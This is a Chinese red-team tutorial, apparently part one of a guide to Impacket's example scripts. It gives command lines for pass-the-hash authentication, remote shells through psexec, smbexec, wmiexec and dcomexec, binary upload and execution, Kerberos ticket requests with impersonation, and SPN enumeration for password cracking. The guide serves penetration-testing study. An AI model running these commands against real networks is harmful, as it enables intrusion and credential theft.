# Impacket脚本利用指南（上）
Su1Xu3@深蓝攻防实验室
在平时的项目中，我们经常使用Impacket的脚本，例如Secretsdump、ntlmrelayx，但是实际上Impacket的利用除了示例脚本外还有很多，示例脚本只是其中一部分。因为Impacket的定位是一个处理各种网络协议的Python类。提供对数据包的底层编程，并为某些协议提供对应的协议实现。
不过因为示例脚本的可用性、以及示例脚本存在多种用法。所以这篇文章旨在研究学习Impacket所有示例脚本的功能，并通过示例脚本学习Impacket库的使用。
# Impacket的脚本介绍
以下是本篇文章将会介绍使用方法的脚本一览：
类型 | 脚本名 | 脚本介绍  
---|---|---  
远程执行 | psexec.py | 使用了RemComSvc的实现了PSEXEC功能的脚本。  
远程执行 | smbexec.py | 类似PSECEX的执行方式，但未使用RemComSvc。这个脚本使用了一个本地SMB
Server接收返回的结果，可以避免目标SMB没有可写的目录  
远程执行 | atexec.py | 这个脚本通过MS-TSCH协议控制计划任务在目标机器上执行命令并获得回显  
远程执行 | wmiexec.py | 通过WMI实现了半交互式的Shell，不需要在目标安装任何服务或软件。而且高度隐蔽的以管理员权限运行  
远程执行 | dcomexec.py |
类似wmiexec.py的半交互式Shell，但是使用了DCOM接口，目前支持的接口有`MMC20.Application`、`ShellWindows`、`ShellBrowserWindows`  
Kerberos协议 | GetTGT.py | 提供密码、hash或aeskey用来请求TGT并且保存为ccache格式  
Kerberos协议 | GetST.py |
提供密码、hash、aeskey或ccache格式的TGT，可以请求服务票据并保存为ccache格式。如果提供的账户存在约束委派且支持协议转换，那么可以使用-impersonate选项模拟为其他用户请求票据  
Kerberos协议 | GetPac.py | 这个脚本会为指定用户请求经过身份验证的PAC，通过使用MS-SFU协议的S4USelf和U2U的Kerberos认证实现  
Kerberos协议 | GetUserSPNs.py | 这个脚本会找出和普通用户账户关联的SPN，输出格式与JtR和hashcat兼容  
Kerberos协议 | GetNPUsers.py |
这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容。  
Kerberos协议 | rbcd.py | 这个脚本可以处理目标机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性  
Kerberos协议 | ticketConverter.py |
这个脚本可以在mimikatz常用的kirbi文件和Impacket常用的ccache文件之间进行转换  
Kerberos协议 | ticketer.py |
这个脚本可以基于模板或自己创建金、银票据，并允许你自定义PAC_LOGON_INFO、groups、ExtraSids、duration等属性  
Kerberos协议 | raiseChild.py | 这个脚本通过金票据和ExtraSids实现从子域到域森林的提权  
Windows密码 | secretsdump.py |
提供各种技术以不运行任何程序远程dump密码。对SAM和LSA以及缓存的凭据，会尝试从目标注册表中读取并将hives保存在`%SYSTEMROOT%\Temp`目录，再将hives读取回来。对于DIT文件，会使用`DL_DRSGetNCChanges`函数来dump目标的NTLM
hash、明文密码和Kerberos
keys。也可以通过smbexec或wmiexec执行vssadmin得到NTDS.dit，并对其进行解密。这个脚本在服务不可用的情况下会打开对应的服务，例如远程注册表。在执行结束后，会将激活的服务还原。  
Windows密码 | mimikatz.py | 一个用来控制远程mimikatz RPC服务器的Shell，由@gentikiwi开发。  
# Impacket脚本使用实例
## 通用选项
### hash认证
    py -3 xxx.py domain/user@ip -hashes :161cff084477fe596a5db81874498a24
### Kerberos认证
    export KRB5CCNAME=ad01.ccache 
    py -3 xxx.py -k -no-pass
### 指定目标IP
    -target-ip 192.168.40.156
### 指定域控IP
    -dc-ip 192.168.40.156
## 远程执行
### psexec.py
可使用密码认证、hash认证、kerberos认证。
#### 常用命令
**交互式Shell**
    py -3 psexec.py test/administrator:1qaz@PI:EMAIL
**执行单命令**
    py -3 psexec.py test/administrator:1qaz@PI:EMAIL whoami
**上传文件并执行**
    py -3 psexec.py test/PI:EMAIL "/c 1+1"  -remote-binary-name test.exe  -codec 936 -path c:\windows\temp\ -c p.exe -hashes :161cff084477fe596a5db81874498a24
#### 常用选项
    -port [destination port] 指定目标SMB的端口
    -codec codec 目标回显的编码，可先执行chcp.com拿到回显编码
    -service-name service_name 指定创建服务的名称，默认随机
    -remote-binary-name remote_binary_name 指定上传文件的名称，默认随机
### smbexec.py
可使用密码认证、hash认证、kerberos认证。
需要注意此脚本有一些参数是硬编码的，最好使用前修改一下。还可以增加单行命令执行的功能。
#### 常用命令
**交互式Shell**
    py -3 smbexec.py test/administrator:1qaz@PI:EMAIL
#### 常用选项
    -share SHARE 自定义回显的共享路径，默认为C$
    -mode {SHARE,SERVER} 设置SHARE回显或者SERVER回显，SERVER回显需要root linux
    -shell-type {cmd,powershell} 设置返回的Shell类型
### atexec.py
可使用密码认证、hash认证、kerberos认证。
脚本使用前可修改一下回显的共享路径
#### 常用命令
**执行命令获得回显**
    py -3 atexec.py test/administrator:1qaz@PI:EMAIL whoami
#### 常用选项
    -session-id SESSION_ID 使用登录的SESSION运行（无回显，不会主动调用cmd如silentcommand）
    -silentcommand 不运行cmd.exe，直接运行命令
### wmiexec.py
可使用密码认证、hash认证、kerberos认证。
#### 常用命令
    py -3 wmiexec.py test/administrator:1qaz@PI:EMAIL
#### 常用选项
    -share SHARE 设置连接的共享路径，默认ADMIN$
    -nooutput 不获取输出，没有SMB连接
    -silentcommand 不运行cmd.exe，直接运行命令
    -shell-type {cmd,powershell} 设置返回的Shell类型
    -com-version MAJOR_VERSION:MINOR_VERSION 设置DCOM版本
### dcomexec.py
可使用密码认证、hash认证、kerberos认证。
一般使用MMC20，而且DCOM有时候会遇到0x800706ba的错误，一般都是被防火墙拦截。
#### 常用命令
    py -3 dcomexec.py -object MMC20 test.com/administrator:1qaz@PI:EMAIL
#### 常用选项
    -share SHARE 设置连接的共享路径，默认ADMIN$
    -nooutput 不获取输出，没有SMB连接
    -object [{ShellWindows,ShellBrowserWindow,MMC20}] 设置RCE利用的类型
    -com-version MAJOR_VERSION:MINOR_VERSION 设置DCOM版本
    -shell-type {cmd,powershell} 设置返回的Shell类型
    -silentcommand 不运行cmd.exe，直接运行命令
## Kerberos协议
### GetTGT.py
可使用密码认证、hash认证、kerberos认证。
通过认证后去DC请求TGT并保存。
#### 常用命令
获取administrator用户的TGT，TGT过期前可拿来获取其权限
    py -3 GetTGT.py test/administrator:1qaz@WSX -dc-ip 192.168.40.156
### GetST.py
可使用密码认证、hash认证、kerberos认证。
通过认证后去DC请求ST并保存。
#### 常用命令
用administrator的权限获取AD01.test.com的cifs服务的服务票据（ST）
    py -3 GetST.py test/administrator:1qaz@WSX -dc-ip 192.168.40.156 -spn cifs/AD01.test.com
#### 常用选项
    -impersonate IMPERSONATE    模拟为指定的用户的权限
    -additional-ticket ticket.ccache    在委派的S4U2Proxy中添加一个可转发的服务票据
    -force-forwardable  通过CVE-2020-17049强制忽略校验票据是否可转发
### GetPac.py
可使用密码认证、hash认证
#### 常用命令
查询test用户的PAC，可以看到登录次数、密码错误次数之类的
    py -3 getPac.py test.com/administrator:1qaz@WSX -targetUser test
### GetUserSPNs.py
可使用密码认证、hash认证、Kerberos认证
#### 常用命令
查询test.com中的用户的SPN有哪些，只需要任意一个域用户即可利用，只要有用户的SPN可以请求，可以获取其TGS爆破其密码
    py -3 GetUserSPNs.py test.com/administrator:1qaz@WSX -target-domain test.com
#### 常用选项